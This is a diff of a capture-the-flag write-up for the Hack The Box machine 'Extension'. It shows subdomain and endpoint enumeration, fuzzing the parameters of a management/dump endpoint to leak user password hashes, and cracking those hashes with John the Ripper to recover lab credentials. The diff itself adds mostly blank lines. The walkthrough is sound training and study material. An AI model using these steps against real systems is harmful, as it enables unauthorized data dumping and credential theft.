@@ -29,8 +29,11 @@ Nmap done: 1 IP address (1 host up) scanned in 713.11 seconds
 
 Looks like there's not much running, just a http service running on the machine.
 
+
 Visiting the site shows us this:
+
 ![snippet htb](https://user-images.githubusercontent.com/57739806/218312922-63dbdb25-a428-460d-abc5-66412e064adf.png)
+
 
 Modifying `/etc/hosts` to resolve `10.10.11.171` to `snippet.htb`, I can start enumerating any subdomains and endpoints.
 
@@ -76,6 +79,7 @@ Progress: 4614 / 4615 (99.98%)==================================================
 ===============================================================
 ```
 
+
 > Subdomain enumeration
 ```
 ┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
@@ -102,15 +106,19 @@ Filtered Requests: 19962
 Requests/sec.: 15.78561
 ```
 
+
+
 Adding those subdomains into my `/etc/hosts` file, and visiting those sites show:
 
 `dev.snippet.htb`
 
 ![dev snippet htb](https://user-images.githubusercontent.com/57739806/218316168-f3d3b9c5-f0f3-49f1-b621-16a87fbcbc8d.png)
 
+
 `mail.snippet.htb`
 
 ![mail snippet htb](https://user-images.githubusercontent.com/57739806/218316188-e44456a1-3429-464e-8572-d4c1a56a168f.png)
+
 
 Now it's time for more endpoint enumeration :D
 
@@ -143,6 +151,7 @@ Progress: 4614 / 4615 (99.98%)==================================================
 ===============================================================
 ```
 
+
 Endpoints of `mail.snippet.htb`:
 
 ```
@@ -169,6 +178,7 @@ Progress: 4614 / 4615 (99.98%)==================================================
 2023/02/12 22:05:40 Finished
 ===============================================================
 ```
+
 
 # Foothold
 Since all of these sites had login pages, I tried SQL and noSQL injections, just in case, and they weren't vulnerable.
@@ -197,7 +207,10 @@ I got stuck for a while, until I decided to look into the source code of `snippe
 const Ziggy = {"url":"http:\/\/snippet.htb","port":null,"defaults":{},"routes":{"ignition.healthCheck":{"uri":"_ignition\/health-check","methods":["GET","HEAD"]},"ignition.executeSolution":{"uri":"_ignition\/execute-solution","methods":["POST"]},"ignition.shareReport":{"uri":"_ignition\/share-report","methods":["POST"]},"ignition.scripts":{"uri":"_ignition\/scripts\/{script}","methods":["GET","HEAD"]},"ignition.styles":{"uri":"_ignition\/styles\/{style}","methods":["GET","HEAD"]},"dashboard":{"uri":"dashboard","methods":["GET","HEAD"]},"users":{"uri":"users","methods":["GET","HEAD"]},"snippets":{"uri":"snippets","methods":["GET","HEAD"]},"snippets.view":{"uri":"snippets\/{id}","methods":["GET","HEAD"]},"snippets.update":{"uri":"snippets\/update\/{id}","methods":["GET","HEAD"]},"api.snippets.update":{"uri":"snippets\/update\/{id}","methods":["POST"]},"api.snippets.delete":{"uri":"snippets\/delete\/{id}","methods":["DELETE"]},"snippets.new":{"uri":"new","methods":["GET","HEAD"]},"users.validate":{"uri":"management\/validate","methods":["POST"]},"admin.management.dump":{"uri":"management\/dump","methods":["POST"]},"register":{"uri":"register","methods":["GET","HEAD"]},"login":{"uri":"login","methods":["GET","HEAD"]},"password.request":{"uri":"forgot-password","methods":["GET","HEAD"]},"password.email":{"uri":"forgot-password","methods":["POST"]},"password.reset":{"uri":"reset-password\/{token}","methods":["GET","HEAD"]},"password.update":{"uri":"reset-password","methods":["POST"]},"verification.notice":{"uri":"verify-email","methods":["GET","HEAD"]},"verification.verify":{"uri":"verify-email\/{id}\/{hash}","methods":["GET","HEAD"]},"verification.send":{"uri":"email\/verification-notification","methods":["POST"]},"password.confirm":{"uri":"confirm-password","methods":["GET","HEAD"]},"logout":{"uri":"logout","methods":["POST"]}}};
 ...
 ```
+
+
 It looks like all the endpoints of `snippet.htb`, although there are some we didn't get while enumerating. Looking through these endpoints, `management/dump` looks interesting as we can potentially get credentials from it.
+
 
 Using burpsuite, and modifying the GET request to a POST request, we're met with an error:
 ![First obstacle](https://user-images.githubusercontent.com/57739806/218317369-f4faacf6-843f-48be-af59-975eee33495c.png)
@@ -206,6 +219,8 @@ Using burpsuite, and modifying the GET request to a POST request, we're met with
 A bit of googling, it looks like I need a `X-CSRF-Token` header with the appropriate value to be able to make POST requests.
 We already have a valid POST request from the site, the login page, so I modified that request instead and got a successful result:
 ![Successful post request](https://user-images.githubusercontent.com/57739806/218317557-65a2ab98-e7b2-485d-a9f7-d6fb4ca26f53.png)
+
+
 
 
 It's giving us a 400 error with an error message of "Missing arguments", so maybe we need to figure out what arguments the endpoint accepts?
@@ -227,6 +242,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 000000045:   400        0 L      2 W        42 Ch       "download"
 ```
+
 
 Looks like I got a hit on the first argument, trying it out in burpsuite shows that the server is still giving us a 400 error code but now with an error message of "Unknown tablename". Now it's time to brute-force the values accepted for the value.
 
@@ -253,6 +269,8 @@ Looks like there are multiple values accepted, and testing each one in burpsuite
 ![User creds obtained](https://user-images.githubusercontent.com/57739806/218318727-3a2bc03d-8217-496f-848e-dd3f8f4c0853.png)
 
 
+
+
 After obtaining the credentials, it's time to try cracking the password hashes. (After processing the information in the json first, that is)
 ```
 ┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
@@ -262,6 +280,8 @@ After obtaining the credentials, it's time to try cracking the password hashes. 
 100  266k    0  266k  100    21   262k     20  0:00:01  0:00:01 --:--:--  262k
 ```
 
+
+
 Writing a simply python script to do the cleaning up for me (process.py), 
 ```py
 l = eval(open("out.txt").read())
@@ -270,11 +290,15 @@ with open("hash.txt", "w") as file:
     file.write(s)
 ```
 
+
+
 And then running it, 
 ```
 ┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
 └─$ python3 process.py
 ```
+
+
 
 Having the hashes in a format suitable for John the Ripper, we just need to figure out what hash type the passwords are.
 Grabbing a random hash and using `haiti`, 
@@ -298,6 +322,8 @@ MD6-256
 Umbraco HMAC-SHA1 [HC: 24800]
 ```
 
+
+
 Looks like it's just SHA256, and with that, it's time to crack hashes.
 ```
 ┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
@@ -320,5 +346,7 @@ fredrick@snippet.htb:password123
 gia@snippet.htb:password123
 juliana@snippet.htb:password123
 ```
+
+
 
 Credentials obtained!
